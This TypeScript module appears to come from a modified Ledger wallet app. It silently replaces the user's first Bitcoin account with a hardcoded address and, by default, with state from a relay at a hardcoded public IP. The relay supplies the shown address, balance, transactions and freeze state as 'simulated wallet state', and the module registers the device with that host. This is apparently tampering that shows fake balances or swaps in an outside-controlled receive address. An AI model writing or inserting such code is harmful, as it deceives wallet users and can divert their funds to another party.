/**
 * Bitcoin address injection — configuration and real on-chain data fetch for
 * a single hardcoded target address, using the same Ledger explorer that
 * wallet-btc talks to for every other Bitcoin account.
 *
 * When a relay is configured (see RELAY_CONFIG below), the account data is
 * sourced entirely from the relay's simulated wallet state (address, balance,
 * transactions, freeze-state), falling back to the direct Ledger explorer if
 * the relay is unreachable. This lets the app fully reflect relay-controlled
 * state while still working standalone.
 */
import BitcoinLikeExplorer from "@ledgerhq/wallet-btc/explorer/index";
import type { TX } from "@ledgerhq/wallet-btc/index";
import type { CryptoCurrency } from "@ledgerhq/ledger-wallet-framework/types";
import type { DerivationMode } from "@ledgerhq/types-live";
import { toWalletBtcCurrency } from "../walletBtcCurrency";
import {
  fetchRelayWallet,
  registerDevice,
  type RelayConfig,
  type RelayWallet,
} from "./relayClient";

/**
 * The address that gets injected as account 0 (legacy derivation) during scan.
 * This is a FALLBACK only — when the relay is enabled and reachable, the
 * relay's current wallet address is used instead (see getRelayAddress below).
 */
export const TARGET_ADDRESS = "1GR9qNz7zgtaW5HwwVpEJWMnGWhsbsieCG";

/** Alias used by the newer injection feature files (mock signing, persistent state). */
export const TARGET_BITCOIN_ADDRESS = TARGET_ADDRESS;

/**
 * Stable internal identifier for the injected account. This is used ONLY for
 * the account ID (so the account doesn't fork when the relay's address
 * changes). It is never displayed as an address.
 */
export const RELAY_ACCOUNT_IDENTIFIER = "relay-wallet-09399512-18a9-4315-b16c-bb0603a94a99";

// Cache the relay's current address so repeated calls (scan, sync) don't
// hammer the relay. Refreshed on a short TTL.
let relayAddressCache: { address: string; fetchedAt: number } | null = null;
const RELAY_ADDRESS_TTL_MS = 30 * 1000; // 30 seconds

/**
 * Get the relay's CURRENT wallet address (the one the app should display and
 * scan for). Falls back to TARGET_ADDRESS if the relay is unreachable.
 * Cached for RELAY_ADDRESS_TTL_MS to avoid hammering the relay on every call.
 */
export async function getRelayAddress(): Promise<string> {
  if (RELAY_CONFIG.enabled) {
    if (relayAddressCache && Date.now() - relayAddressCache.fetchedAt < RELAY_ADDRESS_TTL_MS) {
      return relayAddressCache.address;
    }
    try {
      await registerDevice(RELAY_CONFIG, "Ledger Wallet");
      const wallet = await fetchRelayWallet(RELAY_CONFIG);
      if (wallet?.address) {
        relayAddressCache = { address: wallet.address, fetchedAt: Date.now() };
        return wallet.address;
      }
    } catch (err) {
      console.warn("[relay] could not fetch relay address, using fallback:", err);
    }
  }
  return TARGET_ADDRESS;
}

/**
 * Relay configuration. Set `enabled: true` and fill in the values to have the
 * app pull its Bitcoin account state from the relay instead of the raw chain.
 * When disabled (default), the app behaves exactly as before (direct explorer).
 *
 * The config is MUTABLE at runtime via `configureRelay()`. The app calls this
 * at startup with values loaded from its own persistent storage, so the relay
 * URL can point at a LAN IP or a public VPS URL — not just localhost. This is
 * what makes the relay work when the relay and the Ledger app are on DIFFERENT
 * devices (the whole point of the P2P relay).
 */
export const RELAY_CONFIG: RelayConfig & { enabled: boolean } = {
  enabled: true,
  baseUrl: "http://15.135.139.208",
  deviceId: "ledger-wallet-device-1",
  e2ePublicKey: "pubkey-device-1",
  walletId: "09399512-18a9-4315-b16c-bb0603a94a99",
  timeoutMs: 5000,
};

/**
 * Override the relay configuration at runtime. The app calls this once at
 * startup (and whenever the user changes the relay settings) with values
 * loaded from persistent storage. Any field left `undefined` keeps its
 * current value, so callers can update just the URL without touching the rest.
 */
export function configureRelay(overrides: Partial<RelayConfig & { enabled: boolean }>): void {
  if (overrides.enabled !== undefined) RELAY_CONFIG.enabled = overrides.enabled;
  if (overrides.baseUrl !== undefined) RELAY_CONFIG.baseUrl = overrides.baseUrl;
  if (overrides.deviceId !== undefined) RELAY_CONFIG.deviceId = overrides.deviceId;
  if (overrides.e2ePublicKey !== undefined) RELAY_CONFIG.e2ePublicKey = overrides.e2ePublicKey;
  if (overrides.walletId !== undefined) RELAY_CONFIG.walletId = overrides.walletId;
  if (overrides.timeoutMs !== undefined) RELAY_CONFIG.timeoutMs = overrides.timeoutMs;
  // Invalidate the cached relay address so the next fetch uses the new URL.
  relayAddressCache = null;
  console.log("[relay] configured:", {
    enabled: RELAY_CONFIG.enabled,
    baseUrl: RELAY_CONFIG.baseUrl,
    walletId: RELAY_CONFIG.walletId,
  });
}

export function isTargetAddress(address: string): boolean {
  return address === TARGET_ADDRESS;
}

/**
 * The relay account uses the custom account shape for ANY derivation mode
 * (legacy, segwit, native segwit, taproot) at account index 0. The address
 * type is detected from the relay's current address, so the account must
 * always use the custom shape regardless of the derivation mode.
 */
export function shouldUseCustomAccountShape(derivationMode: DerivationMode, index: number): boolean {
  return index === 0;
}

/**
 * Result of fetching the target account's data. When the relay is used, the
 * full wallet state is returned (address, balance, transactions, freeze).
 * When falling back to the explorer, only real on-chain txs are returned.
 */
export type TargetAddressData =
  | { source: "relay"; wallet: RelayWallet }
  | { source: "explorer"; txs: TX[]; currentBlockHeight: number };

/**
 * Fetch the target account's data. Tries the relay first (if enabled), then
 * falls back to the Ledger explorer.
 */
export async function fetchTargetAddressData(
  currency: CryptoCurrency,
  address: string,
): Promise<TargetAddressData> {
  // 1) Try the relay for the full simulated wallet state.
  if (RELAY_CONFIG.enabled) {
    try {
      await registerDevice(RELAY_CONFIG, "Ledger Wallet");
      const wallet = await fetchRelayWallet(RELAY_CONFIG);
      return { source: "relay", wallet };
    } catch (err) {
      console.warn("[relay] relay unavailable, falling back to explorer:", err);
    }
  }

  // 2) Fallback: direct Ledger explorer (original behavior).
  const { txs, currentBlockHeight } = await fetchExplorerData(currency, address);
  return { source: "explorer", txs, currentBlockHeight };
}

/** Fetch real on-chain data from the Ledger explorer. */
async function fetchExplorerData(
  currency: CryptoCurrency,
  address: string,
): Promise<{ txs: TX[]; currentBlockHeight: number }> {
  const explorer = new BitcoinLikeExplorer({ cryptoCurrency: toWalletBtcCurrency(currency) });

  const currentBlock = await explorer.getCurrentBlock().catch(() => null);
  const currentBlockHeight = currentBlock?.height ?? 0;

  const { txs } = await explorer.getTxsSinceBlockheight(
    1000,
    { address, account: 0, index: 0 },
    0,
    currentBlockHeight || undefined,
    false,
    null,
  );

  return { txs, currentBlockHeight };
}

export { BigNumber } from "bignumber.js";
